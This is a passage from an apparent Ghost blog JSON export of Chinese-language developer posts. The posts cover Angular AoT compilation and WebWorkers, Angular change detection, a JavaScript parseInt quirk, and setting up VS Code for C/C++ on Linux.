console.log(e);\n    del('./temp/aot');\n    cb();\n  }).stdout.on('data', function (data) { console.log(data); });\n}));\n//gulpfile.js\n\n\ntsconfig-aot.json\n{\n  \"compilerOptions\": {\n    \"target\": \"es5\",\n    \"lib\": [\n      \"es2015\",\n      \"dom\"\n    ],\n    \"module\": \"commonjs\",\n    \"moduleResolution\": \"node\",\n    \"declaration\": true,\n    \"experimentalDecorators\": true,\n    \"emitDecoratorMetadata\": true,\n    \"outDir\": \"lib\",\n    \"rootDir\": \"./temp/inline\",\n    \"sourceMap\": true,\n    \"inlineSources\": true,\n    \"noImplicitAny\": false\n  },\n  \"typeRoots\": [\n    // add path to @types\n    \"node_modules/@types\"\n  ],\n  \"files\": [\n    \"temp/inline/index.ts\"\n  ],\n  \"exclude\": [\n    \"node_modules\"\n  ],\n  \"angularCompilerOptions\": {\n    \"strictMetadataEmit\": true,\n    \"genDir\": \"temp/aot\"\n  }\n}\n\n\nAoT 编译\n首先安装@angular/compiler-cli @angular/compiler\n\n运行ngc -p tsconfig-aot.json是AoT 编译，要求严格的，不要使用tsc编译。遇到的一些坑。除了第二条不提示以外，其他按照提示改就行。\n\n 1. template标签必须用ng-template代替。可能我用的@angular/compiler版本较高。\n 2. AoT 不支持\"export default class\",这个有点坑。不管是component还是module,不要用default导出。\n 3. interface和type等必须export出来。\n\nnpm publish\n按照上次npm包发布就行。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-08-08T11:21:41.000Z","created_by":"1","updated_at":"2017-08-10T05:32:32.000Z","updated_by":"1","published_at":"2017-08-08T11:22:03.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d334","uuid":"5ce20fee-82c8-45d8-bf65-6097d4191c0d","title":"Angular With WebWorkers","slug":"untitled","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\n\\n# Angular With WebWorkers\\n\\n\\n## 使用\\n\\n- \\n  `npm install --save @angular/platform-webworker @angular/platform-webworker-dynamic`\\n\\n\\n\\n- 在app.module.ts文件中，把`BrowserModule` 替换`WorkerAppModule`，从`@angular/platform-webworker`中导出。\\n\\n\\n\\n- 修改main.ts\\n\\n   ```typescript\\n   import { bootstrapWorkerUi } from '@angular/platform-webworker';\\n\\n   bootstrapWorkerUi('webworker.bundle.js');\\n   ```\\n\\n- 添加workerLoader.ts 文件,这是webworker的入口。主要把`platformBrowser`改成`platformWorkerAppDynamic`,从`@angular/platform-webworker-dynamic`引入。\\n\\n   ```typescript\\n   import 'polyfills.ts';\\n   import '@angular/core';\\n   import '@angular/common';\\n\\n   import { platformWorkerAppDynamic } from '@angular/platform-webworker-dynamic';\\n   import { AppModule } from './app/app.module';\\n\\n   platformWorkerAppDynamic().bootstrapModule(AppModule);\\n   ```\\n\\n- 修改打包方式\\n\\n   ```typescript\\n     \\\"entry\\\": {\\n       \\\"main\\\": [\\n         \\\"./src/main.ts\\\"\\n       ],\\n       \\\"polyfills\\\": [\\n         \\\"./src/polyfills.ts\\\"\\n       ],\\n       \\\"styles\\\": [\\n         \\\"./src/styles.css\\\"\\n       ],\\n       \\\"webworker\\\": [\\n         \\\"./src/workerLoader.ts\\\" //增加一个入口。\\n       ]\\n     },\\n      plugins: [\\n           new HtmlWebpackPlugin({\\n               template: 'src/index.html',\\n               excludeChunks: ['webworker'] //这不能在html引入，要通过platformWorkerAppDynamic加载webworker\\n           })\\n       ]\\n   ```\\n\\n\\n\\n\\n\\n\\n\\n## 在webworker上面运行差异\\n\\n- 1.ElementRef类型的nativeElement属性，本来是获取dom。在webworker中是拿不到的。如果要对dom操作，使用ng自带的Renderer2、Renderer。\\n\\n- 2.angular的RouterModule好像不能用，`webworker.bundle.js:73400 Unhandled Promise rejection: No provider for PlatformLocation! ; Zone: <root> ; Task: Promise.then ; Value: Error: No provider for PlatformLocation!`\\n\\n- 3.window，document不能使用。意味着`document.cookie`拿不到，且`window.localStorage`一样。\\n\\n- 4.`location `对象（只读）：不能设置，可能导致angular router不能使用的原因。而且\\n\\n- `location.href`===`http://localhost:8080/webworker.bundle.js`。结果应该是`http://localhost:8080/`。\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><h1 id=\"angularwithwebworkers\">Angular With WebWorkers</h1>\n<h2 id=\"\">使用</h2>\n<ul>\n<li>\n<p><code>npm install --save @angular/platform-webworker @angular/platform-webworker-dynamic</code></p>\n</li>\n<li>\n<p>在app.module.ts文件中，把<code>BrowserModule</code> 替换<code>WorkerAppModule</code>，从<code>@angular/platform-webworker</code>中导出。</p>\n</li>\n<li>\n<p>修改main.ts</p>\n<pre><code class=\"language-typescript\">import { bootstrapWorkerUi } from '@angular/platform-webworker';\n\nbootstrapWorkerUi('webworker.bundle.js');\n</code></pre>\n</li>\n<li>\n<p>添加workerLoader.ts 文件,这是webworker的入口。主要把<code>platformBrowser</code>改成<code>platformWorkerAppDynamic</code>,从<code>@angular/platform-webworker-dynamic</code>引入。</p>\n<pre><code class=\"language-typescript\">import 'polyfills.ts';\nimport '@angular/core';\nimport '@angular/common';\n\nimport { platformWorkerAppDynamic } from '@angular/platform-webworker-dynamic';\nimport { AppModule } from './app/app.module';\n\nplatformWorkerAppDynamic().bootstrapModule(AppModule);\n</code></pre>\n</li>\n<li>\n<p>修改打包方式</p>\n<pre><code class=\"language-typescript\">  &quot;entry&quot;: {\n    &quot;main&quot;: [\n      &quot;./src/main.ts&quot;\n    ],\n    &quot;polyfills&quot;: [\n      &quot;./src/polyfills.ts&quot;\n    ],\n    &quot;styles&quot;: [\n      &quot;./src/styles.css&quot;\n    ],\n    &quot;webworker&quot;: [\n      &quot;./src/workerLoader.ts&quot; //增加一个入口。\n    ]\n  },\n   plugins: [\n        new HtmlWebpackPlugin({\n            template: 'src/index.html',\n            excludeChunks: ['webworker'] //这不能在html引入，要通过platformWorkerAppDynamic加载webworker\n        })\n    ]\n</code></pre>\n</li>\n</ul>\n<h2 id=\"webworker\">在webworker上面运行差异</h2>\n<ul>\n<li>\n<p>1.ElementRef类型的nativeElement属性，本来是获取dom。在webworker中是拿不到的。如果要对dom操作，使用ng自带的Renderer2、Renderer。</p>\n</li>\n<li>\n<p>2.angular的RouterModule好像不能用，<code>webworker.bundle.js:73400 Unhandled Promise rejection: No provider for PlatformLocation! ; Zone: &lt;root&gt; ; Task: Promise.then ; Value: Error: No provider for PlatformLocation!</code></p>\n</li>\n<li>\n<p>3.window，document不能使用。意味着<code>document.cookie</code>拿不到，且<code>window.localStorage</code>一样。</p>\n</li>\n<li>\n<p>4.<code>location </code>对象（只读）：不能设置，可能导致angular router不能使用的原因。而且</p>\n</li>\n<li>\n<p><code>location.href</code>===<code>http://localhost:8080/webworker.bundle.js</code>。结果应该是<code>http://localhost:8080/</code>。</p>\n</li>\n</ul>\n<!--kg-card-end: markdown-->","comment_id":"120","plaintext":"Angular With WebWorkers\n使用\n * npm install --save @angular/platform-webworker\n   @angular/platform-webworker-dynamic\n   \n   \n * 在app.module.ts文件中，把BrowserModule 替换WorkerAppModule，从\n   @angular/platform-webworker中导出。\n   \n   \n * 修改main.ts\n   \n   import { bootstrapWorkerUi } from '@angular/platform-webworker';\n   \n   bootstrapWorkerUi('webworker.bundle.js');\n   \n   \n   \n * 添加workerLoader.ts 文件,这是webworker的入口。主要把platformBrowser改成\n   platformWorkerAppDynamic,从@angular/platform-webworker-dynamic引入。\n   \n   import 'polyfills.ts';\n   import '@angular/core';\n   import '@angular/common';\n   \n   import { platformWorkerAppDynamic } from '@angular/platform-webworker-dynamic';\n   import { AppModule } from './app/app.module';\n   \n   platformWorkerAppDynamic().bootstrapModule(AppModule);\n   \n   \n   \n * 修改打包方式\n   \n     \"entry\": {\n       \"main\": [\n         \"./src/main.ts\"\n       ],\n       \"polyfills\": [\n         \"./src/polyfills.ts\"\n       ],\n       \"styles\": [\n         \"./src/styles.css\"\n       ],\n       \"webworker\": [\n         \"./src/workerLoader.ts\" //增加一个入口。\n       ]\n     },\n      plugins: [\n           new HtmlWebpackPlugin({\n               template: 'src/index.html',\n               excludeChunks: ['webworker'] //这不能在html引入，要通过platformWorkerAppDynamic加载webworker\n           })\n       ]\n   \n   \n   \n\n在webworker上面运行差异\n * 1.ElementRef类型的nativeElement属性，本来是获取dom。在webworker中是拿不到的。如果要对dom操作，使用ng自带的Renderer2、Renderer。\n   \n   \n * 2.angular的RouterModule好像不能用，webworker.bundle.js:73400 Unhandled Promise\n   rejection: No provider for PlatformLocation! ; Zone: <root> ; Task:\n   Promise.then ; Value: Error: No provider for PlatformLocation!\n   \n   \n * 3.window，document不能使用。意味着document.cookie拿不到，且window.localStorage一样。\n   \n   \n * 4.location 对象（只读）：不能设置，可能导致angular router不能使用的原因。而且\n   \n   \n * location.href===http://localhost:8080/webworker.bundle.js。结果应该是\n   http://localhost:8080/。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-08-15T09:50:08.000Z","created_by":"1","updated_at":"2017-08-15T10:53:22.000Z","updated_by":"1","published_at":"2017-08-15T09:51:17.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d335","uuid":"6a2a45f5-c713-4167-adc9-10dd6afd3661","title":"再谈Angular变化检测","slug":"zai-tan-angularbian-hua-jian-ce","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"## 什么是变化检测？\\n\\nangular，react等前端mvvm框架，都是读取组件内部状态渲染页面。但是，当运行时组件状态变化时，页面已经被渲染了，我们必须弄清每个组件的状态发生了什么变化。访问DOM是很昂贵的，因此，必须找出需要更新的位置，尽可能小的访问。\\n\\n\\n\\n## 什么是angular变化检测\\n\\n```typescript\\n@Component({\\n  template: `\\n    <h1>{{firstname}} {{lastname}}</h1>\\n    <button (click)=\\\"changeName()\\\">Change name</button>\\n  `\\n})\\nclass MyApp {\\n\\n  firstname:string = 'Pascal';\\n  lastname:string = 'Precht';\\n\\n  changeName() {\\n    this.firstname = 'Brad';\\n    this.lastname = 'Green';\\n  }\\n}\\n```\\n\\n这个组件模板就绑定了两个属性`firstname` `lastname`，当这个两个属性没改变时，这里就不需要更新。\\n\\n## 什么时候进行变化检测\\n\\n`angular`中包含了一个`zonejs`，zone.js采用猴子补丁（Monkey-patched）的暴力方式将JavaScript中的异步任务都包裹了一层，使得这些异步任务都将运行在zone的上下文中。\\n\\n- **EVENT** - `click`，`submit`，...\\n- **XHR** - `AJAX` `Fetch`\\n- **计时器** - `setTimeout()`，`setInterval()`\\n- **Promise**- `async`\\n\\n基本上每当执行一些异步操作时，我们的应用程序状态**可能**已经改变。这时需要有人告诉Angular来更新视图。\\n\\n以下是缩略版本的源码,ApplicationRef就是angular程序的根，它是监听了`NgZone`的`onMicrotaskEmpty`，无论什么异步操作都会通知angular执行变化检测。\\n\\n```typescript\\nclass ApplicationRef {\\n\\n  changeDetectorRefs:ChangeDetectorRef[] = [];\\n\\n  constructor(private zone: NgZone) {\\n      this._zone.onMicrotaskEmpty.subscribe(\\n          {next: () => { this._zone.run(() => { this.tick(); }); }});//订阅zone的通知，然后执行tick变化检测的函数。\\n  }\\n\\n  tick() {\\n    this.changeDetectorRefs\\n      .forEach((ref) => ref.detectChanges());\\n  }\\n}\\n```\\n\\n## Angular变更检测方式\\n\\nAngular变更检测是一个单向数据流，总是从根部开始到每个组件。如下面两种图。\\n\\n![](/content/images/2017/08/QQ--20170817112553.png)j\\n\\n![](/content/images/2017/08/QQ--20170817130813.png)\\n\\n## 优化变化检测\\n\\nAngular变化检测是非常快的。它可以在几毫秒内执行数十万次检查。这主要是由于Angular生成VM友好的代码。但是，它还是可能造成性能问题。比如大量列表，或者在IE浏览器上面，IE的js `runtime`比不上V8的速度的。\\n\\n\\n\\n### 一.手动变化检测\\n\\n上面都是Angular自动的。Angular每个组件都可以注入`ChangeDetectorRef`，就能手动变化检测了。首先改变changeDetection设置为`OnPush` \\n\\n#### OnPush\\n   当组件changeDetection设置为`OnPush`时，Angular变化检测除了在第一次，其他时候将跳过这个组件和子组件（在ng2中有些不同）。除非`@Input()`属性变化了。\\n   ```typescript\\n   @Component({\\n     template: `\\n    <h2>{{vData.name}}</h2>\\n    <span>{{vData.email}}</span>\\n     `,\\n     changeDetection: ChangeDetectionStrategy.OnPush\\n   })\\n   class VCardCmp {\\n     @Input() vData;\\n   }\\n   ```\\n\\n  \\n![](/content/images/2017/08/QQ--20170828151707.png)\\n\\n#### markForCheck\\n\\n   在父组件或者自己设置`OnPush`后，这时使用`setTimeout`改变绑定数据，发现没有变化。我们需要使用`ChangeDetectorRef`的`markForCheck`，告诉Angular进行**一次**检测。运行一次`markForCheck`只能检测一次。\\n\\n   ```typescript\\n     constructor(private cdRef: ChangeDetectorRef) {\\n     }\\n    click(){\\n      this.xxxx=123;\\n      //this.cdRef.markForCheck();这里可以不需要，事件会自动执行markForCheck方法。\\n      \\tsetTimeout(()=>{\\n         this.xxxx=456;\\n         this.cdRef.markForCheck(); //必须在回调函数中再次执行markForCheck。\\n   \\t})\\n    }\\n   ```\\n\\n#### ChangeDetectorRef其他\\n\\n   * **detectChanges** - 从该组件到各个子组件执行一次变化检测。就是Angular程序根部(ApplicationRef)绑定的东西。\\n   * **detach** - 从变化检测树中分离，该组件将不再执行变化检测，除非手动调用 reattach() 方法。\\n   * **reattach** - 重新添加已分离的变化检测器。\\n\\n\\n\\n### 二.可观察的数据\\n\\n使用Angular自带的Async管道。AsyncPipe不仅仅支持Observable<T>，还支持Promise<T>。\\n\\n```typescript\\n constructor(private _ref: ChangeDetectorRef) {}\\n private _updateLatestValue(async: any, value: Object): void {\\n    if (async === this._obj) {\\n      this._latestValue = value;\\n      this._ref.markForCheck();//当改变数据的时候，call markForCheck方法;\\n    }\\n  }\\n  ngOnDestroy(): void {\\n    if (this._subscription) {\\n      this._dispose();//当组件销毁的时候，Observable会自动注销监听\\n    }\\n  }\\n```\\n\\n### 三.不可变的数据\\n\\n[Immutable](https://facebook.github.io/immutable-js/) 主要Angular已经自带Rxjs。Immutable和Rxjs一样都是很大的。一般在Angular中很少使用Immutable。\\n\\n\\n\\n\\n\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><h2 id=\"\">什么是变化检测？</h2>\n<p>angular，react等前端mvvm框架，都是读取组件内部状态渲染页面。但是，当运行时组件状态变化时，页面已经被渲染了，我们必须弄清每个组件的状态发生了什么变化。访问DOM是很昂贵的，因此，必须找出需要更新的位置，尽可能小的访问。</p>\n<h2 id=\"angular\">什么是angular变化检测</h2>\n<pre><code class=\"language-typescript\">@Component({\n  template: `\n    &lt;h1&gt;{{firstname}} {{lastname}}&lt;/h1&gt;\n    &lt;button (click)=&quot;changeName()&quot;&gt;Change name&lt;/button&gt;\n  `\n})\nclass MyApp {\n\n  firstname:string = 'Pascal';\n  lastname:string = 'Precht';\n\n  changeName() {\n    this.firstname = 'Brad';\n    this.lastname = 'Green';\n  }\n}\n</code></pre>\n<p>这个组件模板就绑定了两个属性<code>firstname</code> <code>lastname</code>，当这个两个属性没改变时，这里就不需要更新。</p>\n<h2 id=\"\">什么时候进行变化检测</h2>\n<p><code>angular</code>中包含了一个<code>zonejs</code>，zone.js采用猴子补丁（Monkey-patched）的暴力方式将JavaScript中的异步任务都包裹了一层，使得这些异步任务都将运行在zone的上下文中。</p>\n<ul>\n<li><strong>EVENT</strong> - <code>click</code>，<code>submit</code>，...</li>\n<li><strong>XHR</strong> - <code>AJAX</code> <code>Fetch</code></li>\n<li><strong>计时器</strong> - <code>setTimeout()</code>，<code>setInterval()</code></li>\n<li><strong>Promise</strong>- <code>async</code></li>\n</ul>\n<p>基本上每当执行一些异步操作时，我们的应用程序状态<strong>可能</strong>已经改变。这时需要有人告诉Angular来更新视图。</p>\n<p>以下是缩略版本的源码,ApplicationRef就是angular程序的根，它是监听了<code>NgZone</code>的<code>onMicrotaskEmpty</code>，无论什么异步操作都会通知angular执行变化检测。</p>\n<pre><code class=\"language-typescript\">class ApplicationRef {\n\n  changeDetectorRefs:ChangeDetectorRef[] = [];\n\n  constructor(private zone: NgZone) {\n      this._zone.onMicrotaskEmpty.subscribe(\n          {next: () =&gt; { this._zone.run(() =&gt; { this.tick(); }); }});//订阅zone的通知，然后执行tick变化检测的函数。\n  }\n\n  tick() {\n    this.changeDetectorRefs\n      .forEach((ref) =&gt; ref.detectChanges());\n  }\n}\n</code></pre>\n<h2 id=\"angular\">Angular变更检测方式</h2>\n<p>Angular变更检测是一个单向数据流，总是从根部开始到每个组件。如下面两种图。</p>\n<p><img src=\"/content/images/2017/08/QQ--20170817112553.png\" alt=\"\">j</p>\n<p><img src=\"/content/images/2017/08/QQ--20170817130813.png\" alt=\"\"></p>\n<h2 id=\"\">优化变化检测</h2>\n<p>Angular变化检测是非常快的。它可以在几毫秒内执行数十万次检查。这主要是由于Angular生成VM友好的代码。但是，它还是可能造成性能问题。比如大量列表，或者在IE浏览器上面，IE的js <code>runtime</code>比不上V8的速度的。</p>\n<h3 id=\"\">一.手动变化检测</h3>\n<p>上面都是Angular自动的。Angular每个组件都可以注入<code>ChangeDetectorRef</code>，就能手动变化检测了。首先改变changeDetection设置为<code>OnPush</code></p>\n<h4 id=\"onpush\">OnPush</h4>\n<p>当组件changeDetection设置为<code>OnPush</code>时，Angular变化检测除了在第一次，其他时候将跳过这个组件和子组件（在ng2中有些不同）。除非<code>@Input()</code>属性变化了。</p>\n<pre><code class=\"language-typescript\">@Component({\n  template: `\n &lt;h2&gt;{{vData.name}}&lt;/h2&gt;\n &lt;span&gt;{{vData.email}}&lt;/span&gt;\n  `,\n  changeDetection: ChangeDetectionStrategy.OnPush\n})\nclass VCardCmp {\n  @Input() vData;\n}\n</code></pre>\n<p><img src=\"/content/images/2017/08/QQ--20170828151707.png\" alt=\"\"></p>\n<h4 id=\"markforcheck\">markForCheck</h4>\n<p>在父组件或者自己设置<code>OnPush</code>后，这时使用<code>setTimeout</code>改变绑定数据，发现没有变化。我们需要使用<code>ChangeDetectorRef</code>的<code>markForCheck</code>，告诉Angular进行<strong>一次</strong>检测。运行一次<code>markForCheck</code>只能检测一次。</p>\n<pre><code class=\"language-typescript\">  constructor(private cdRef: ChangeDetectorRef) {\n  }\n click(){\n   this.xxxx=123;\n   //this.cdRef.markForCheck();这里可以不需要，事件会自动执行markForCheck方法。\n   \tsetTimeout(()=&gt;{\n      this.xxxx=456;\n      this.cdRef.markForCheck(); //必须在回调函数中再次执行markForCheck。\n\t})\n }\n</code></pre>\n<h4 id=\"changedetectorref\">ChangeDetectorRef其他</h4>\n<ul>\n<li><strong>detectChanges</strong> - 从该组件到各个子组件执行一次变化检测。就是Angular程序根部(ApplicationRef)绑定的东西。</li>\n<li><strong>detach</strong> - 从变化检测树中分离，该组件将不再执行变化检测，除非手动调用 reattach() 方法。</li>\n<li><strong>reattach</strong> - 重新添加已分离的变化检测器。</li>\n</ul>\n<h3 id=\"\">二.可观察的数据</h3>\n<p>使用Angular自带的Async管道。AsyncPipe不仅仅支持Observable<T>，还支持Promise<T>。</p>\n<pre><code class=\"language-typescript\"> constructor(private _ref: ChangeDetectorRef) {}\n private _updateLatestValue(async: any, value: Object): void {\n    if (async === this._obj) {\n      this._latestValue = value;\n      this._ref.markForCheck();//当改变数据的时候，call markForCheck方法;\n    }\n  }\n  ngOnDestroy(): void {\n    if (this._subscription) {\n      this._dispose();//当组件销毁的时候，Observable会自动注销监听\n    }\n  }\n</code></pre>\n<h3 id=\"\">三.不可变的数据</h3>\n<p><a href=\"https://facebook.github.io/immutable-js/\">Immutable</a> 主要Angular已经自带Rxjs。Immutable和Rxjs一样都是很大的。一般在Angular中很少使用Immutable。</p>\n<!--kg-card-end: markdown-->","comment_id":"121","plaintext":"什么是变化检测？\nangular，react等前端mvvm框架，都是读取组件内部状态渲染页面。但是，当运行时组件状态变化时，页面已经被渲染了，我们必须弄清每个组件的状态发生了什么变化。访问DOM是很昂贵的，因此，必须找出需要更新的位置，尽可能小的访问。\n\n什么是angular变化检测\n@Component({\n  template: `\n    <h1>{{firstname}} {{lastname}}</h1>\n    <button (click)=\"changeName()\">Change name</button>\n  `\n})\nclass MyApp {\n\n  firstname:string = 'Pascal';\n  lastname:string = 'Precht';\n\n  changeName() {\n    this.firstname = 'Brad';\n    this.lastname = 'Green';\n  }\n}\n\n\n这个组件模板就绑定了两个属性firstname lastname，当这个两个属性没改变时，这里就不需要更新。\n\n什么时候进行变化检测\nangular中包含了一个zonejs\n，zone.js采用猴子补丁（Monkey-patched）的暴力方式将JavaScript中的异步任务都包裹了一层，使得这些异步任务都将运行在zone的上下文中。\n\n * EVENT - click，submit，...\n * XHR - AJAX Fetch\n * 计时器 - setTimeout()，setInterval()\n * Promise- async\n\n基本上每当执行一些异步操作时，我们的应用程序状态可能已经改变。这时需要有人告诉Angular来更新视图。\n\n以下是缩略版本的源码,ApplicationRef就是angular程序的根，它是监听了NgZone的onMicrotaskEmpty\n，无论什么异步操作都会通知angular执行变化检测。\n\nclass ApplicationRef {\n\n  changeDetectorRefs:ChangeDetectorRef[] = [];\n\n  constructor(private zone: NgZone) {\n      this._zone.onMicrotaskEmpty.subscribe(\n          {next: () => { this._zone.run(() => { this.tick(); }); }});//订阅zone的通知，然后执行tick变化检测的函数。\n  }\n\n  tick() {\n    this.changeDetectorRefs\n      .forEach((ref) => ref.detectChanges());\n  }\n}\n\n\nAngular变更检测方式\nAngular变更检测是一个单向数据流，总是从根部开始到每个组件。如下面两种图。\n\nj\n\n\n\n优化变化检测\nAngular变化检测是非常快的。它可以在几毫秒内执行数十万次检查。这主要是由于Angular生成VM友好的代码。但是，它还是可能造成性能问题。比如大量列表，或者在IE浏览器上面，IE的js \nruntime比不上V8的速度的。\n\n一.手动变化检测\n上面都是Angular自动的。Angular每个组件都可以注入ChangeDetectorRef\n，就能手动变化检测了。首先改变changeDetection设置为OnPush\n\nOnPush\n当组件changeDetection设置为OnPush时，Angular变化检测除了在第一次，其他时候将跳过这个组件和子组件（在ng2中有些不同）。除非\n@Input()属性变化了。\n\n@Component({\n  template: `\n <h2>{{vData.name}}</h2>\n <span>{{vData.email}}</span>\n  `,\n  changeDetection: ChangeDetectionStrategy.OnPush\n})\nclass VCardCmp {\n  @Input() vData;\n}\n\n\n\n\nmarkForCheck\n在父组件或者自己设置OnPush后，这时使用setTimeout改变绑定数据，发现没有变化。我们需要使用ChangeDetectorRef的\nmarkForCheck，告诉Angular进行一次检测。运行一次markForCheck只能检测一次。\n\n  constructor(private cdRef: ChangeDetectorRef) {\n  }\n click(){\n   this.xxxx=123;\n   //this.cdRef.markForCheck();这里可以不需要，事件会自动执行markForCheck方法。\n   \tsetTimeout(()=>{\n      this.xxxx=456;\n      this.cdRef.markForCheck(); //必须在回调函数中再次执行markForCheck。\n\t})\n }\n\n\nChangeDetectorRef其他\n * detectChanges - 从该组件到各个子组件执行一次变化检测。就是Angular程序根部(ApplicationRef)绑定的东西。\n * detach - 从变化检测树中分离，该组件将不再执行变化检测，除非手动调用 reattach() 方法。\n * reattach - 重新添加已分离的变化检测器。\n\n二.可观察的数据\n使用Angular自带的Async管道。AsyncPipe不仅仅支持Observable，还支持Promise。\n\n constructor(private _ref: ChangeDetectorRef) {}\n private _updateLatestValue(async: any, value: Object): void {\n    if (async === this._obj) {\n      this._latestValue = value;\n      this._ref.markForCheck();//当改变数据的时候，call markForCheck方法;\n    }\n  }\n  ngOnDestroy(): void {\n    if (this._subscription) {\n      this._dispose();//当组件销毁的时候，Observable会自动注销监听\n    }\n  }\n\n\n三.不可变的数据\nImmutable [https://facebook.github.io/immutable-js/] \n主要Angular已经自带Rxjs。Immutable和Rxjs一样都是很大的。一般在Angular中很少使用Immutable。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-08-17T05:04:41.000Z","created_by":"1","updated_at":"2018-02-09T07:16:28.000Z","updated_by":"1","published_at":"2017-08-17T07:37:50.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d336","uuid":"c63f56c8-ff80-424a-8daf-218c4773a889","title":"为啥parseInt(0.0000008) === 8？","slug":"parseint-0-0000008-8","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"## IEEE 754\\njavascript 的数字系统是采用 IEEE 754，一开始看到这个问题，以为是 IEEE 754 导致的问题。\\n常见的问题有浮点数比较：\\n```\\nconsole.log((0.1 + 0.2) == 0.3);  // false\\nconsole.log((0.1 + 0.2) === 0.3); // false\\nconsole.log(0.1 + 0.2); // 0.30000000000000004\\n```\\n## parseInt(string, radix)\\n\\nparseInt(0.0000008)等于parseInt(String(0.0000008),10)\\n```\\nString(0.000008);  // '0.000008'\\nString(0.0000008); // '8e-7'\\n```\\n因此\\nparseInt(String(0.0000008),10）等于parseInt('8e-7',10）===8\\n## 结论\\n不要将 parseInt 当做转换 Number 和 Integer 的工具。\\n```\\nparseInt(1/0, 19);      // 18\\nparseInt(false, 16);    // 250\\nparseInt(parseInt, 16); // 15\\nparseInt(\\\"0x10\\\");       // 16\\nparseInt(\\\"10\\\", 2);      // 2\\n```\\n> http://blog.csdn.net/Vanhukseter/article/details/43459927\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><h2 id=\"ieee754\">IEEE 754</h2>\n<p>javascript 的数字系统是采用 IEEE 754，一开始看到这个问题，以为是 IEEE 754 导致的问题。<br>\n常见的问题有浮点数比较：</p>\n<pre><code>console.log((0.1 + 0.2) == 0.3);  // false\nconsole.log((0.1 + 0.2) === 0.3); // false\nconsole.log(0.1 + 0.2); // 0.30000000000000004\n</code></pre>\n<h2 id=\"parseintstringradix\">parseInt(string, radix)</h2>\n<p>parseInt(0.0000008)等于parseInt(String(0.0000008),10)</p>\n<pre><code>String(0.000008);  // '0.000008'\nString(0.0000008); // '8e-7'\n</code></pre>\n<p>因此<br>\nparseInt(String(0.0000008),10）等于parseInt('8e-7',10）===8</p>\n<h2 id=\"\">结论</h2>\n<p>不要将 parseInt 当做转换 Number 和 Integer 的工具。</p>\n<pre><code>parseInt(1/0, 19);      // 18\nparseInt(false, 16);    // 250\nparseInt(parseInt, 16); // 15\nparseInt(&quot;0x10&quot;);       // 16\nparseInt(&quot;10&quot;, 2);      // 2\n</code></pre>\n<blockquote>\n<p><a href=\"http://blog.csdn.net/Vanhukseter/article/details/43459927\">http://blog.csdn.net/Vanhukseter/article/details/43459927</a></p>\n</blockquote>\n<!--kg-card-end: markdown-->","comment_id":"122","plaintext":"IEEE 754\njavascript 的数字系统是采用 IEEE 754，一开始看到这个问题，以为是 IEEE 754 导致的问题。\n常见的问题有浮点数比较：\n\nconsole.log((0.1 + 0.2) == 0.3);  // false\nconsole.log((0.1 + 0.2) === 0.3); // false\nconsole.log(0.1 + 0.2); // 0.30000000000000004\n\n\nparseInt(string, radix)\nparseInt(0.0000008)等于parseInt(String(0.0000008),10)\n\nString(0.000008);  // '0.000008'\nString(0.0000008); // '8e-7'\n\n\n因此\nparseInt(String(0.0000008),10）等于parseInt('8e-7',10）===8\n\n结论\n不要将 parseInt 当做转换 Number 和 Integer 的工具。\n\nparseInt(1/0, 19);      // 18\nparseInt(false, 16);    // 250\nparseInt(parseInt, 16); // 15\nparseInt(\"0x10\");       // 16\nparseInt(\"10\", 2);      // 2\n\n\n> http://blog.csdn.net/Vanhukseter/article/details/43459927","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-08-20T12:39:00.000Z","created_by":"1","updated_at":"2017-08-20T12:47:28.000Z","updated_by":"1","published_at":"2017-08-20T12:47:28.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d337","uuid":"9e81e138-917d-49d0-986d-cd89b578af46","title":"linux下，使用vscode开发c/c++","slug":"linux-2","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"###先安装编译工具。g++,build-essential。\\n错误实例 g++: error trying to exec 'cc1plus': execvp: 没有那个文件或目录,这时因为缺少g++，或者gcc和g++版本不一致。\\n```\\nsudo apt-get install build-essential\\nsudo apt-get install g++\\n```\\n###vscode安装vscode-cpptools插件\\n它带了很多的功能，如clang格式化代码，利用gdb断点调试。如果提示miDebuggerPath没找到，则安装gdb`sudo apt-get install gdb`\\n\\n###makefile\\nmakefile带来的好处就是——“自动化编译”，一旦写好，只需要一个make命令，整个工程完全自动编译，极大的提高了软件开发的效率。make是一个命令工具，是一个解释makefile中指令的命令工具。\\n实例如下：\\n```\\nbuild : 1.o\\n\\tg++ -o main 1.o\\n1.o : 1.cpp \\n\\tg++ -g -c 1.cpp\\nclean :\\n\\trm 1.o main\\n```\\n\\n<pre class=\\\"code\\\" data-lang=\\\"json\\\">\\n///launch.json\\n{\\n    \\\"version\\\": \\\"0.2.0\\\",\\n    \\\"configurations\\\": [\\n        {\\n            